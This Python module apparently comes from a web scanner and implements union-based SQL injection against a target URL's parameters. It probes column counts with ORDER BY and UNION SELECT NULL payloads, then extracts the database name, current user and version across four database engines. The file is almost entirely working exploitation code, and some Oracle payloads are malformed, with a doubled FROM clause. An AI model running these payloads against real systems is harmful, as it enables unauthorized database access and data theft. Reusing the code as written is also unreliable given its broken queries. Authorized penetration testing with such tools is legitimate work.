"""
Union-based SQL injection detection and exploitation.
"""
import re
import time
from typing import List, Dict, Optional, Tuple, Set
import logging
from dataclasses import dataclass
from urllib.parse import quote

from .payloads import SQLiPayloads

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class UnionColumn:
    """Information about a UNION column"""
    position: int
    data_type: str  # 'string', 'numeric', 'null'
    is_vulnerable: bool
    sample_data: Optional[str] = None

@dataclass
class UnionResult:
    """Results from union-based SQL injection testing"""
    parameter: str
    payload: str
    is_vulnerable: bool
    confidence: float
    column_count: Optional[int] = None
    vulnerable_columns: List[UnionColumn] = None
    database_type: Optional[str] = None
    evidence: Optional[Dict] = None
    extracted_data: Optional[Dict] = None
    
    def __post_init__(self):
        if self.vulnerable_columns is None:
            self.vulnerable_columns = []
        if self.evidence is None:
            self.evidence = {}
        if self.extracted_data is None:
            self.extracted_data = {}

class UnionBasedSQLiTester:
    """Union-based SQL injection tester"""
    
    def __init__(self, payloads: SQLiPayloads = None):
        self.payloads = payloads or SQLiPayloads()
        
        # Maximum number of columns to test
        self.max_columns = 10
        
        # Test strings for different data types
        self.test_strings = {
            'string': ['test', 'union', 'sql', 'injection'],
            'numeric': ['1', '2', '3', '4', '5'],
            'null': ['NULL']
        }
        
        # Database-specific UNION syntax
        self.union_syntax = {
            'mysql': " UNION SELECT {columns} -- ",
            'postgresql': " UNION SELECT {columns} -- ",
            'mssql': " UNION SELECT {columns} -- ",
            'oracle': " UNION SELECT {columns} FROM DUAL -- ",
        }
    
    def test_parameter(self, url: str, parameter: str, method: str,
                      get_params: Dict, post_data: Dict, session) -> List[UnionResult]:
        """
        Test a parameter for union-based SQL injection.
        
        Args:
            url: Target URL
            parameter: Parameter to test
            method: HTTP method
            get_params: GET parameters
            post_data: POST data
            session: Requests session
            
        Returns:
            List of UnionResult objects
        """
        results = []
        
        # Step 1: Determine number of columns using ORDER BY
        column_count = self._find_column_count(
            url, parameter, method, get_params, post_data, session
        )
        
        if column_count is None:
            logger.info(f"Could not determine column count for {parameter}")
            return results
        
        logger.info(f"Found {column_count} columns for {parameter}")
        
        # Step 2: Test UNION injection with different database types
        for db_type in ['mysql', 'postgresql', 'mssql', 'oracle']:
            result = self._test_union_injection(
                url, parameter, method, get_params, post_data, session,
                db_type, column_count
            )
            
            if result and result.is_vulnerable:
                results.append(result)
        
        return results
    
    def _find_column_count(self, url: str, parameter: str, method: str,
                          get_params: Dict, post_data: Dict, session) -> Optional[int]:
        """
        Find the number of columns using ORDER BY technique.
        
        Returns:
            Number of columns or None if not found
        """
        for i in range(1, self.max_columns + 1):
            # Test ORDER BY with increasing column numbers
            order_by_payload = f"' ORDER BY {i} -- "
            
            try:
                response = self._send_request(
                    url, parameter, order_by_payload, method,
                    get_params, post_data, session
                )
                
                if response:
                    # Check for error (indicating too many columns)
                    if self._has_sql_error(response.text):
                        # Previous column number is the correct count
                        return i - 1
                    
                    # Also check for different response indicating invalid column
                    baseline_response = self._get_baseline_response(
                        url, parameter, method, get_params, post_data, session
                    )
                    
                    if baseline_response and not self._responses_similar(
                        response.text, baseline_response
                    ):
                        # Response changed, might be wrong column number
                        continue
                
            except Exception as e:
                logger.debug(f"ORDER BY {i} failed: {e}")
        
        # Try UNION SELECT NULL method as fallback
        return self._find_column_count_union(url, parameter, method, get_params, post_data, session)
    
    def _find_column_count_union(self, url: str, parameter: str, method: str,
                                get_params: Dict, post_data: Dict, session) -> Optional[int]:
        """Find column count using UNION SELECT NULL method."""
        for i in range(1, self.max_columns + 1):
            # Create NULL column list
            null_columns = ', '.join(['NULL'] * i)
            union_payload = f"' UNION SELECT {null_columns} -- "
            
            try:
                response = self._send_request(
                    url, parameter, union_payload, method,
                    get_params, post_data, session
                )
                
                if response and response.status_code < 400:
                    # Check if UNION worked (no error)
                    if not self._has_sql_error(response.text):
                        baseline = self._get_baseline_response(
                            url, parameter, method, get_params, post_data, session
                        )
                        
                        if baseline and self._responses_similar(response.text, baseline):
                            # Response is similar to baseline, UNION might have worked
                            return i
                
            except Exception as e:
                logger.debug(f"UNION SELECT NULL x{i} failed: {e}")
        
        return None
    
    def _test_union_injection(self, url: str, parameter: str, method: str,
                             get_params: Dict, post_data: Dict, session,
                             db_type: str, column_count: int) -> Optional[UnionResult]:
        """
        Test UNION injection for a specific database type.
        
        Returns:
            UnionResult or None
        """
        logger.info(f"Testing UNION injection for {db_type} with {column_count} columns")
        
        # Step 1: Find string columns
        string_columns = self._find_string_columns(
            url, parameter, method, get_params, post_data, session,
            db_type, column_count
        )
        
        if not string_columns:
            logger.debug(f"No string columns found for {db_type}")
            return None
        
        # Step 2: Test actual UNION injection
        test_payloads = self._generate_union_payloads(db_type, column_count, string_columns)
        
        for payload in test_payloads:
            try:
                response = self._send_request(
                    url, parameter, payload, method,
                    get_params, post_data, session
                )
                
                if not response:
                    continue
                
                # Check for successful UNION
                if self._is_union_successful(response.text, payload):
                    # Extract data from vulnerable columns
                    extracted_data = self._extract_union_data(
                        url, parameter, method, get_params, post_data, session,
                        db_type, column_count, string_columns
                    )
                    
                    # Create vulnerable columns list
                    vulnerable_cols = []
                    for col_pos in string_columns:
                        sample = extracted_data.get(f'column_{col_pos}', '')
                        vulnerable_cols.append(UnionColumn(
                            position=col_pos,
                            data_type='string',
                            is_vulnerable=True,
                            sample_data=sample[:100] if sample else None
                        ))
                    
                    result = UnionResult(
                        parameter=parameter,
                        payload=payload,
                        is_vulnerable=True,
                        confidence=0.8,
                        column_count=column_count,
                        vulnerable_columns=vulnerable_cols,
                        database_type=db_type,
                        evidence={
                            'response_status': response.status_code,
                            'content_length': len(response.text),
                            'string_columns': string_columns
                        },
                        extracted_data=extracted_data
                    )
                    
                    logger.info(f"✅ Union-based SQLi found in {parameter} ({db_type})")
                    logger.info(f"   Columns: {column_count}, String columns: {string_columns}")
                    
                    return result
                
            except Exception as e:
                logger.debug(f"UNION test failed: {e}")
        
        return None
    
    def _find_string_columns(self, url: str, parameter: str, method: str,
                            get_params: Dict, post_data: Dict, session,
                            db_type: str, column_count: int) -> List[int]:
        """
        Find which columns can display string data.
        
        Returns:
            List of column positions (1-indexed) that accept strings
        """
        string_columns = []
        
        for col in range(1, column_count + 1):
            # Create payload with string in this column, NULL in others
            columns = []
            for i in range(1, column_count + 1):
                if i == col:
                    columns.append("'test'")
                else:
                    columns.append("NULL")
            
            union_query = ', '.join(columns)
            
            if db_type == 'oracle':
                payload = f"' UNION SELECT {union_query} FROM DUAL -- "
            else:
                payload = f"' UNION SELECT {union_query} -- "
            
            try:
                response = self._send_request(
                    url, parameter, payload, method,
                    get_params, post_data, session
                )
                
                if response and response.status_code < 400:
                    # Check if string appeared in response
                    if 'test' in response.text:
                        string_columns.append(col)
                        logger.debug(f"Column {col} accepts strings")
                
                time.sleep(0.5)  # Be polite
                
            except Exception as e:
                logger.debug(f"String column test for column {col} failed: {e}")
        
        return string_columns
    
    def _generate_union_payloads(self, db_type: str, column_count: int, 
                                string_columns: List[int]) -> List[str]:
        """Generate UNION payloads for testing."""
        payloads = []
        
        # Basic payload with version information
        for col in string_columns[:2]:  # Use first two string columns
            columns = []
            for i in range(1, column_count + 1):
                if i == col:
                    if db_type == 'mysql':
                        columns.append('@@version')
                    elif db_type == 'postgresql':
                        columns.append('version()')
                    elif db_type == 'mssql':
                        columns.append('@@version')
                    elif db_type == 'oracle':
                        columns.append("banner FROM v$version WHERE rownum=1")
                    else:
                        columns.append("'union_test'")
                else:
                    columns.append('NULL')
            
            union_query = ', '.join(columns)
            
            if db_type == 'oracle':
                payload = f"' UNION SELECT {union_query} FROM DUAL -- "
            else:
                payload = f"' UNION SELECT {union_query} -- "
            
            payloads.append(payload)
        
        # Additional payload with concatenated data
        if len(string_columns) >= 2:
            columns = []
            for i in range(1, column_count + 1):
                if i == string_columns[0]:
                    if db_type == 'mysql':
                        columns.append('CONCAT(user(), \"|\", database())')
                    elif db_type == 'postgresql':
                        columns.append('current_user || \'|\' || current_database()')
                    elif db_type == 'mssql':
                        columns.append('user_name() + \'|\' + db_name()')
                    elif db_type == 'oracle':
                        columns.append('user || \'|\' FROM dual')
                    else:
                        columns.append("'test1'")
                elif i == string_columns[1]:
                    columns.append("'test2'")
                else:
                    columns.append('NULL')
            
            union_query = ', '.join(columns)
            
            if db_type == 'oracle':
                payload = f"' UNION SELECT {union_query} FROM DUAL -- "
            else:
                payload = f"' UNION SELECT {union_query} -- "
            
            payloads.append(payload)
        
        return payloads
    
    def _extract_union_data(self, url: str, parameter: str, method: str,
                           get_params: Dict, post_data: Dict, session,
                           db_type: str, column_count: int, 
                           string_columns: List[int]) -> Dict:
        """
        Extract data using UNION injection.
        
        Returns:
            Dictionary with extracted data
        """
        extracted = {}
        
        # Common data to extract
        extraction_queries = [
            ('database_name', self._get_database_name_query(db_type)),
            ('current_user', self._get_current_user_query(db_type)),
            ('version', self._get_version_query(db_type)),
        ]
        
        for col_index, col_pos in enumerate(string_columns[:3]):  # Max 3 columns
            if col_index < len(extraction_queries):
                query_name, query = extraction_queries[col_index]
                
                # Build UNION payload
                columns = []
                for i in range(1, column_count + 1):
                    if i == col_pos:
                        columns.append(query)
                    else:
                        columns.append('NULL')
                
                union_query = ', '.join(columns)
                
                if db_type == 'oracle':
                    payload = f"' UNION SELECT {union_query} FROM DUAL -- "
                else:
                    payload = f"' UNION SELECT {union_query} -- "
                
                try:
                    response = self._send_request(
                        url, parameter, payload, method,
                        get_params, post_data, session
                    )
                    
                    if response:
                        # Try to extract the data from response
                        data = self._extract_data_from_response(
                            response.text, query, db_type
                        )
                        
                        if data:
                            extracted[f'column_{col_pos}'] = data
                            extracted[query_name] = data
                
                except Exception as e:
                    logger.debug(f"Data extraction failed for {query_name}: {e}")
            
            time.sleep(1)  # Be polite
        
        return extracted
    
    def _get_database_name_query(self, db_type: str) -> str:
        """Get query for database name based on DB type."""
        queries = {
            'mysql': 'database()',
            'postgresql': 'current_database()',
            'mssql': 'db_name()',
            'oracle': '(SELECT global_name FROM global_name)'
        }
        return queries.get(db_type, "'db_name'")
    
    def _get_current_user_query(self, db_type: str) -> str:
        """Get query for current user based on DB type."""
        queries = {
            'mysql': 'user()',
            'postgresql': 'current_user',
            'mssql': 'user_name()',
            'oracle': 'user'
        }
        return queries.get(db_type, "'user'")
    
    def _get_version_query(self, db_type: str) -> str:
        """Get query for version based on DB type."""
        queries = {
            'mysql': '@@version',
            'postgresql': 'version()',
            'mssql': '@@version',
            'oracle': 'banner FROM v$version WHERE rownum=1'
        }
        return queries.get(db_type, "'version'")
    
    def _extract_data_from_response(self, response_text: str, query: str, db_type: str) -> Optional[str]:
        """Extract specific data from response text."""
        # Simple extraction - look for common patterns
        lines = response_text.split('\n')
        
        for line in lines:
            line = line.strip()
            if len(line) > 10 and len(line) < 200:  # Reasonable length for extracted data
                # Look for version-like patterns
                version_patterns = [
                    r'\d+\.\d+\.\d+',
                    r'[Mm]ysql',
                    r'[Pp]ostgre[Ss]QL',
                    r'[Ss]QL [Ss]erver',
                    r'[Oo]racle'
                ]
                
                for pattern in version_patterns:
                    if re.search(pattern, line):
                        return line[:100]  # Limit length
        
        return None
    
    def _send_request(self, url: str, param_name: str, payload: str,
                     method: str, get_params: Dict, post_data: Dict, session) -> Optional[any]:
        """Send a request with the payload."""
        try:
            if method.upper() == 'GET':
                params = get_params.copy() if get_params else {}
                params[param_name] = payload
                return session.get(url, params=params, timeout=10)
            else:
                data = post_data.copy() if post_data else {}
                data[param_name] = payload
                return session.post(url, data=data, timeout=10)
        except Exception as e:
            logger.debug(f"Request failed: {e}")
            return None
    
    def _get_baseline_response(self, url: str, parameter: str, method: str,
                              get_params: Dict, post_data: Dict, session) -> Optional[str]:
        """Get baseline response without injection."""
        try:
            if method.upper() == 'GET':
                params = get_params.copy() if get_params else {}
                response = session.get(url, params=params, timeout=10)
            else:
                data = post_data.copy() if post_data else {}
                response = session.post(url, data=data, timeout=10)
            
            return response.text
        except:
            return None
    
    def _has_sql_error(self, text: str) -> bool:
        """Check if response contains SQL error."""
        error_patterns = [
            r'SQL syntax',
            r'MySQL.*error',
            r'PostgreSQL.*ERROR',
            r'ORA-[0-9]{5}',
            r'Unclosed quotation',
            r'Incorrect syntax'
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        
        return False
    
    def _responses_similar(self, text1: str, text2: str) -> bool:
        """Check if two responses are similar."""
        if not text1 or not text2:
            return False
        
        # Simple similarity check
        length1 = len(text1)
        length2 = len(text2)
        
        if length1 == 0 or length2 == 0:
            return False
        
        length_diff = abs(length1 - length2) / max(length1, length2)
        
        return length_diff < 0.3  # Less than 30% length difference
    
    def _is_union_successful(self, response_text: str, payload: str) -> bool:
        """Check if UNION injection was successful."""
        # Check for absence of SQL errors
        if self._has_sql_error(response_text):
            return False
        
        # Look for evidence of UNION in response
        union_indicators = [
            'test',  # From our test strings
            'mysql', 'postgresql', 'sql server', 'oracle',  # Database names
            'version', 'user', 'database'  # Common extracted data
        ]
        
        response_lower = response_text.lower()
        
        for indicator in union_indicators:
            if indicator in response_lower:
                return True
        
        return False

# Test function
def test_union_tester():
    """Test the union-based tester"""
    tester = UnionBasedSQLiTester()
    
    print("Testing UNION payload generation:")
    
    test_cases = [
        ('mysql', 3, [1, 3]),
        ('postgresql', 4, [2, 4]),
        ('oracle', 2, [1]),
    ]
    
    for db_type, col_count, string_cols in test_cases:
        payloads = tester._generate_union_payloads(db_type, col_count, string_cols)
        print(f"\n{db_type} ({col_count} cols, string at {string_cols}):")
        for i, payload in enumerate(payloads[:2]):
            print(f"  {i+1}. {payload[:60]}...")
    
    return tester

if __name__ == "__main__":
    test_union_tester()